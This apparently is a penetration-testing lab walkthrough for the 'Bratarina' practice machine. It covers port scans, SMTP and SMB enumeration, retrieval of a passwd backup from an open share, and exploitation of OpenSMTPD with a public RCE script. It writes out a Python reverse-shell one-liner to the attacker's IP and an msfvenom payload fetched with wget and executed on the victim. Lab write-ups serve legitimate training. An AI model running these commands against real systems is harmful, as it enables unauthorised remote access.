@@ -1,0 +1,90 @@
+																				Bratarina Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.71
+export IP=192.168.68.71
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p22,25,80,445 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+25/tcp  open  smtp        OpenSMTPD
+80/tcp  open  http        nginx 1.14.0 (Ubuntu)
+|_http-title:         Page not found - FlaskBB        
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
+Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000   <!-- nothing -->
+
+
+Vulnerability Assessment
+
+Port 25 - SMTP
+smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t $IP -p 25 
+
+nc -vn $IP 25
+220 ESMTP OpenSMTPD
+
+
+Port 445 - SMB
+
+[+] Got OS info for 192.168.68.71 from srvinfo:                                                                                                                  
+        BRATARINA      Wk Sv PrQ Unx NT SNT Samba 4.7.6-Ubuntu                                                                                                   
+        os version     :       6.1
+
+        Sharename       Type      Comment
+        ---------            ----         -------
+        backups         Disk      Share for backups
+        IPC$             IPC       IPC Service (Samba 4.7.6-Ubuntu)    
+        
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                      
+                                                                                                                                                                 
+S-1-22-1-1000 Unix User\neil (Local User)                                                                                                                        
+S-1-22-1-1001 Unix User\_smtpd (Local User)
+S-1-22-1-1002 Unix User\_smtpq (Local User)
+
+smbclient //$IP/backups -N
+dir
+get passwd.bak
+cat passwd.bak
+root:x:0:0:root:/root:/bin/bash
+neil:x:1000:1000:neil,,,:/home/neil:/bin/bash                            -- maybe brute force 22 ?
+postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+        
+Port 80
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s  
+ /robots.txt: Robots file
+  
+nikto --url $IP 
+nginx/1.14.0 appears to be outdated (current is at least 1.20.1).
+
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                         
+=====================================================================
+
+000002192:   200        25 L     69 W       612 Ch     index.html                                                                                    
+000003569:   200        1 L       2 W        14 Ch        robots.txt                                                                                    
+000003951:   301        7 L      13 W       194 Ch       static    
+
+powered by FlaskBB
+
+searchsploit OpenSMTPD
+OpenSMTPD 6.6.1 - Remote Code Execution                                                                                        | linux/remote/47984.py
+
+Usage 47984.py <target ip> <target port> <command>
+
+python 47984.py 192.168.68.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.68\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
+
+nc -lvnp 80
+
+
+Another way
+
+msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.49.68 LPORT=80 
+
+python3 -m http.server 80
+python 47984.py 192.168.68.71 25 'wget 192.168.49.68/shell -O /tmp/shell'
+
+nc -lvnp 80
+python 47984.py 192.168.68.71 25 '/tmp/shell'
